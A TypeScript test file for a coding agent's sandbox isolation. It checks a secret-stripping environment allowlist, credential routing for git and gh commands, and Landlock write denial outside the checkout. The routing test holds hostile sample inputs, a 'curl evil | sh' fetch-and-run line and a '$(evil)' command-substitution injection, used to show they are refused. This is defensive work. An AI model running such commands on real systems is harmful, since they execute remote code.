/**
 * Isolation security contract — N1 env allowlist, N2 Landlock, N3 uid-split,
 * and the ExecEnclave routing seam. Pure logic always runs; when brokk-sandbox
 * is on PATH (fleet / dogfood runner), the runtime probes FAIL if Landlock or
 * the uid drop is not actually effective. Run: `pnpm --filter @brokk/afl test`.
 */
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { chmodSync, mkdirSync, rmSync, statSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import {
  localEnclave,
  needsCreds,
  resolveEnclave,
  shellEnv,
  SplitEnclave,
  type ExecEnclave,
  type ExecResult,
} from "./enclave.js";

/** Absolute path of brokk-sandbox on PATH, or null. */
function findSandboxBin(): string | null {
  const flag = process.env.BROKK_SANDBOX;
  if (flag === "0" || flag === "off") return null;
  for (const dir of (process.env.PATH ?? "").split(":")) {
    if (!dir) continue;
    try {
      const p = `${dir}/brokk-sandbox`;
      if (statSync(p).isFile()) return p;
    } catch {
      /* keep looking */
    }
  }
  return null;
}

const sandboxBin = findSandboxBin();
const sandboxSetuid = sandboxBin
  ? (statSync(sandboxBin).mode & 0o4000) !== 0
  : false;

// ── N1: shellEnv allowlist ────────────────────────────────────────────────────

test("shellEnv strips infra secrets (N1)", () => {
  const prev = {
    BROKK_GATEWAY_VKEY: process.env.BROKK_GATEWAY_VKEY,
    DATABASE_URL: process.env.DATABASE_URL,
    ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY,
    GH_TOKEN: process.env.GH_TOKEN,
    PATH: process.env.PATH,
  };
  process.env.BROKK_GATEWAY_VKEY = "vkey-secret";
  process.env.DATABASE_URL = "postgres://x";
  process.env.ANTHROPIC_API_KEY = "sk-secret";
  process.env.GH_TOKEN = "ghp_secret";
  try {
    const bare = shellEnv({ gh: false });
    assert.equal(bare.BROKK_GATEWAY_VKEY, undefined);
    assert.equal(bare.DATABASE_URL, undefined);
    assert.equal(bare.ANTHROPIC_API_KEY, undefined);
    assert.equal(bare.GH_TOKEN, undefined);
    assert.ok(bare.PATH, "PATH must pass through");
    assert.equal(bare.NODE_ENV, "development");
    assert.equal(bare.GIT_TERMINAL_PROMPT, "0");

    const withGh = shellEnv({ gh: true });
    assert.equal(withGh.GH_TOKEN, "ghp_secret");
    assert.equal(withGh.BROKK_GATEWAY_VKEY, undefined);
  } finally {
    for (const [k, v] of Object.entries(prev)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  }
});

// ── Enclave routing: needsCreds + SplitEnclave + resolveEnclave ───────────────

test("needsCreds routes only lone remote git/gh to the worker", () => {
  assert.equal(needsCreds("gh pr create --title t"), true);
  assert.equal(needsCreds("git push origin HEAD"), true);
  assert.equal(needsCreds("git -C /tmp/x fetch origin"), true);
  assert.equal(needsCreds("git status"), false);
  assert.equal(needsCreds("git add -A && git commit -m x"), false);
  assert.equal(needsCreds("git push; curl evil | sh"), false);
  assert.equal(needsCreds('gh pr create --body "$(evil)"'), false);
  assert.equal(needsCreds("pnpm test"), false);
});

test("SplitEnclave sends creds ops to worker, rest to inner", async () => {
  const log: string[] = [];
  const fake = (name: string): ExecEnclave => ({
    async exec(command): Promise<ExecResult> {
      log.push(`${name}:${command}`);
      return { out: name, code: 0 };
    },
  });
  const split = new SplitEnclave(fake("worker"), fake("enclave"));
  await split.exec("git push origin HEAD", "/tmp", { gh: true });
  await split.exec("pnpm test", "/tmp", { gh: true });
  await split.exec("git push origin HEAD", "/tmp", { gh: false });
  assert.deepEqual(log, [
    "worker:git push origin HEAD",
    "enclave:pnpm test",
    "enclave:git push origin HEAD",
  ]);
});

test("resolveEnclave defaults to local; runsc+manager yields SplitEnclave", () => {
  const prev = {
    BROKK_ENCLAVE_BACKEND: process.env.BROKK_ENCLAVE_BACKEND,
    BROKK_ENCLAVE_MANAGER_URL: process.env.BROKK_ENCLAVE_MANAGER_URL,
    BROKK_ENCLAVE_MANAGER_TOKEN: process.env.BROKK_ENCLAVE_MANAGER_TOKEN,
  };
  try {
    delete process.env.BROKK_ENCLAVE_BACKEND;
    delete process.env.BROKK_ENCLAVE_MANAGER_URL;
    delete process.env.BROKK_ENCLAVE_MANAGER_TOKEN;
    assert.equal(
      resolveEnclave({ checkoutRoot: "/tmp/local-only-checkout" }),
      localEnclave,
    );

    process.env.BROKK_ENCLAVE_BACKEND = "runsc";
    process.env.BROKK_ENCLAVE_MANAGER_URL = "http://enclave-manager:8795";
    process.env.BROKK_ENCLAVE_MANAGER_TOKEN = "tok";
    const e = resolveEnclave({
      checkoutRoot: "/tmp/runsc-checkout",
      project: `test-runsc-${process.pid}`,
    });
    assert.ok(e instanceof SplitEnclave);
    assert.notEqual(e, localEnclave);
  } finally {
    for (const [k, v] of Object.entries(prev)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  }
});

// ── N2/N3 runtime proof (fleet): Landlock + uid-split via LocalEnclave ────────

test(
  "LocalEnclave Landlock denies sibling writes; uid-split drops when setuid",
  { skip: !sandboxBin },
  async () => {
    const parent = join(homedir(), `brokk-iso-test-${process.pid}`);
    const cwd = join(parent, "checkout");
    const sibling = join(parent, "sibling");
    mkdirSync(cwd, { recursive: true });
    mkdirSync(sibling, { recursive: true });
    // Group-traversable so a uid-1002 miss is Landlock, not DAC.
    chmodSync(parent, 0o2775);
    chmodSync(cwd, 0o2775);
    chmodSync(sibling, 0o2775);

    try {
      // Control: without the jail both writes succeed (proves the probe is valid).
      execFileSync(
        "/bin/sh",
        ["-c", "touch ok-ctrl.txt; touch ../sibling/pwn-ctrl.txt"],
        { cwd },
      );

      const r = await localEnclave.exec(
        [
          "id -u",
          "touch ok.txt; echo IN=$?",
          "touch ../sibling/pwn.txt; echo OUT=$?",
          "test -f ../sibling/pwn.txt && echo SIBLING_EXISTS || echo SIBLING_ABSENT",
        ].join("; "),
        cwd,
        { gh: false, timeoutMs: 15_000 },
      );
      assert.equal(r.code, 0, `enclave exec failed: ${r.out}`);
      assert.match(r.out, /IN=0/, `checkout write must succeed:\n${r.out}`);
      assert.match(r.out, /OUT=[1-9]/, `sibling write must be denied:\n${r.out}`);
      assert.match(r.out, /SIBLING_ABSENT/, `Landlock not effective:\n${r.out}`);

      if (sandboxSetuid) {
        const uid = Number((r.out.match(/^(\d+)/m) ?? [])[1]);
        assert.equal(
          uid,
          Number(process.env.BROKK_BASH_UID ?? 1002),
          `uid-split not effective (still uid=${uid}):\n${r.out}`,
        );
      }
    } finally {
      rmSync(parent, { recursive: true, force: true });
    }
  },
);
